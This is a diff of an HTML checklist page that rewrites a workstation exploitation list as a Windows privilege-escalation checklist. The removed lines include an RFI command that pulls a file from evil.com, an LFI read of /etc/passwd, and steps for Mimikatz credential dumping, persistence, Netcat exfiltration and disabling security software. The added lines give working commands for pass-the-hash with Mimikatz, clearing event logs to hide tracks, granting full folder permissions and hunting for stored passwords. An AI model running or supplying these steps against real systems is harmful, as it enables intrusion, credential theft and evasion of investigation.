@@ -3,45 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Low-Point Workstation Checklist</title>
+    <title>Extended Low Point Workstation Privilege Escalation Checklist</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <header>
-        <h1>Low-Point Workstation Exploitation Checklist</h1>
-        <nav>
-            <a href="index.html">Back to Home</a>
-        </nav>
+        <h1>Extended Low Point Workstation Privilege Escalation Checklist</h1>
     </header>
     <main>
         <article>
-            <h2>Steps for Exploiting Low-Security Workstations</h2>
+            <h2>Detailed Steps for Workstation Privilege Escalation</h2>
             <ul>
-                <li><input type="checkbox" id="nmap-scan"> <label for="nmap-scan">Perform a thorough network scan using Nmap to identify open ports and services. Command: <code>nmap -sV -p- x.x.x.x</code></label></li>
-                <li><input type="checkbox" id="vuln-scan"> <label for="vuln-scan">Run vulnerability scans using tools like Nessus or OpenVAS to detect exploitable vulnerabilities.</label></li>
-                <li><input type="checkbox" id="exploit"> <label for="exploit">Exploit identified vulnerabilities using Metasploit or custom scripts.</label></li>
-                <li><input type="checkbox" id="session-hijack"> <label for="session-hijack">Attempt session hijacking if applicable to gain further access.</label></li>
-                <li><input type="checkbox" id="lfi"> <label for="lfi">Test for Local File Inclusion (LFI) vulnerabilities. Command: <code>curl http://x.x.x.x/page=../../../../etc/passwd</code></label></li>
-                <li><input type="checkbox" id="rfi"> <label for="rfi">Check for Remote File Inclusion (RFI) by including external files. Command: <code>curl http://x.x.x.x/page=http://evil.com/malicious.php</code></label></li>
-                <li><input type="checkbox" id="mimikatz"> <label for="mimikatz">Run Mimikatz to dump credentials from memory.</label></li>
-                <li><input type="checkbox" id="persistence-setup"> <label for="persistence-setup">Establish persistence mechanisms such as scheduled tasks or registry keys.</label></li>
-                <li><input type="checkbox" id="data-exfiltration"> <label for="data-exfiltration">Exfiltrate critical data using secure copy or Netcat.</label></li>
-                <li><input type="checkbox" id="cover-tracks"> <label for="cover-tracks">Cover tracks by cleaning logs and hiding the forensic evidence.</label></li>
-                <li><input type="checkbox" id="analyze-traffic"> <label for="analyze-traffic">Analyze network traffic to find additional targets or data leakage points.</label></li>
-                <li><input type="checkbox" id="security-software"> <label for="security-software">Identify and disable or evade active security software.</label></li>
-                <li><input type="checkbox" id="remote-control"> <label for="remote-control">Set up remote control functionalities for easy access.</label></li>
-                <li><input type="checkbox" id="report-preparation"> <label for="report-preparation">Prepare detailed reports of the exploitation process.</label></li>
-                <li><input type="checkbox" id="operational-security"> <label for="operational-security">Review and ensure operational security throughout the engagement.</label></li>
-                <li><input type="checkbox" id="forensic-readiness"> <label for="forensic-readiness">Prepare for potential forensic investigation by securing logs and artifacts.</label></li>
-                <li><input type="checkbox" id="legal-compliance"> <label for="legal-compliance">Check for compliance with legal requirements post-exploitation.</label></li>
-                <li><input type="checkbox" id="community-engagement"> <label for="community-engagement">Engage with the cybersecurity community to share findings and get feedback.</label></li>
-                <li><input type="checkbox" id="skills-development"> <label for="skills-development">Develop further skills based on the exploitation experience.</label></li>
-                <li><input type="checkbox" id="tool-updates"> <label for="tool-updates">Update and maintain exploitation tools for future readiness.</label></li>
+                <li><input type="checkbox" id="local-recon"> <label for="local-recon"><strong>Local Reconnaissance:</strong> Gather system information to identify potential escalation vectors. (Command: <code>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"</code> - Provides details about the operating system and system architecture.)</label></li>
+                <li><input type="checkbox" id="service-exploits"> <label for="service-exploits"><strong>Service Exploits:</strong> Check for vulnerable services. (Command: <code>sc query | findstr /i "SERVICE_NAME"</code> - Lists all services and their states to identify potential misconfigurations or vulnerable software.)</label></li>
+                <li><input type="checkbox" id="scheduled-tasks"> <label for="scheduled-tasks"><strong>Scheduled Tasks:</strong> Review scheduled tasks for potential misuse. (Command: <code>schtasks /query /fo LIST /v</code> - Displays detailed information about scheduled tasks that could be exploited.)</label></li>
+                <li><input type="checkbox" id="unquoted-paths"> <label for="unquoted-paths"><strong>Unquoted Service Paths:</strong> Exploit unquoted service paths to gain elevated privileges. (Command: <code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\" | findstr /i /v """</code> - Finds services with unquoted paths that could be hijacked.)</label></li>
+                <li><input type="checkbox" id="weak-permissions"> <label for="weak-permissions"><strong>Weak Permissions:</strong> Exploit weak folder permissions to replace executables or configuration files. (Command: <code>icacls "C:\Program Files\Some Software" /grant "username:(F)"</code> - Modifies permissions to allow full control over a directory.)</label></li>
+                <li><input type="checkbox" id="vulnerable-apps"> <label for="vulnerable-apps"><strong>Vulnerable Applications:</strong> Identify and exploit vulnerable installed applications. (Command: <code>wmic product get name,version</code> - Lists installed software for manual checking against vulnerability databases.)</label></li>
+                <li><input type="checkbox" id="driver-exploits"> <label for="driver-exploits"><strong>Driver Exploits:</strong> Check for outdated or vulnerable drivers. (Command: <code>driverquery</code> - Displays all installed device drivers and their properties.)</label></li>
+                <li><input type="checkbox" id="network-sniffing"> <label for="network-sniffing"><strong>Network Sniffing:</strong> Monitor network traffic for credentials or sensitive data. (Command: <code>tcpdump -i eth0 -w capture.pcap</code> - Captures packets on the network interface for later analysis.)</label></li>
+                <li><input type="checkbox" id="clear-logs"> <label for="clear-logs"><strong>Clear Logs:</strong> Clear event logs to hide tracks. (Command: <code>wevtutil cl System</code> - Clears the system log to cover forensic tracks.)</label></li>
+                <li><input type="checkbox" id="pass-the-hash"> <label for="pass-the-hash"><strong>Pass the Hash:</strong> Utilize stolen hashes for authentication bypass. (Command: <code>mimikatz "sekurlsa::pth /user:admin /domain:domain.com /ntlm:HASH /run:cmd.exe"</code> - Opens a new command prompt with elevated privileges using the NTLM hash.)</label></li>
+                <li><input type="checkbox" id="exploit-common-vulns"> <label for="exploit-common-vulns"><strong>Exploit Common Vulnerabilities:</strong> Search for and exploit known vulnerabilities in installed software. (Command: <code>searchsploit [software]</code> - Uses Exploit-DB to find exploits for known vulnerabilities.)</label></li>
+                <li><input type="checkbox" id="registry-perms"> <label for="registry-perms"><strong>Registry Permissions:</strong> Check for misconfigured registry permissions. (Command: <code>reg query HKLM /f "sethc.exe" /t REG_SZ /s</code> - Checks for potential sticky keys override points in the registry.)</label></li>
+                <li><input type="checkbox" id="startup-items"> <label for="startup-items"><strong>Startup Items:</strong> Examine startup items for persistence and privilege escalation opportunities. (Command: <code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code> - Lists programs that run on startup.)</label></li>
+                <li><input type="checkbox" id="path-interception"> <label for="path-interception"><strong>Path Interception:</strong> Identify writable directories in the system PATH for DLL hijacking. (Command: <code>echo %PATH%</code> and <code>icacls</code> to check permissions.)</label></li>
+                <li><input type="checkbox" id="symbolic-link-abuse"> <label for="symbolic-link-abuse"><strong>Symbolic Link Abuse:</strong> Use symbolic links to redirect access to controlled resources. (Command: <code>mklink /D link target</code> - Creates a symbolic link to redirect operations from an intended target to an attacker-controlled target.)</label></li>
+                <li><input type="checkbox" id="credentials-in-files"> <label for="credentials-in-files"><strong>Credentials in Files:</strong> Search file systems for stored credentials. (Command: <code>findstr /si password *.txt *.ini *.config</code> - Searches for the string "password" across common text-based config files.)</label></li>
+                <li><input type="checkbox" id="secrets-management"> <label for="secrets-management"><strong>Secrets Management:</strong> Check for improper secrets management solutions. (Command: <code>dir /s *secrets*.xml *creds*.txt</code> - Searches for files that might store sensitive information.)</label></li>
+                <li><input type="checkbox" id="outdated-components"> <label for="outdated-components"><strong>Outdated Components:</strong> Identify and exploit outdated components and libraries. (Command: <code>sigcheck -u -e C:\path\to\directory</code> - Checks for unsigned and older versions of files in a directory.)</label></li>
+                <li><input type="checkbox" id="logon-scripts"> <label for="logon-scripts"><strong>Logon Scripts:</strong> Investigate logon scripts for exploitation opportunities. (Command: <code>type %LOGONSERVER%\netlogon\logon.bat</code> - Displays the contents of a common logon script.)</label></li>
+                <li><input type="checkbox" id="service-configs"> <label for="service-configs"><strong>Service Configurations:</strong> Examine service configurations for weaknesses. (Command: <code>sc qc servicename</code> - Queries the configuration of a specified service to identify potential misconfigurations or vulnerabilities.)</label></li>
             </ul>
         </article>
     </main>
     <footer>
-        <p Copyright 2024 WillJTools</p>
+        <p>&copy; 2024 WillJTools</p>
     </footer>
 </body>
 </html>
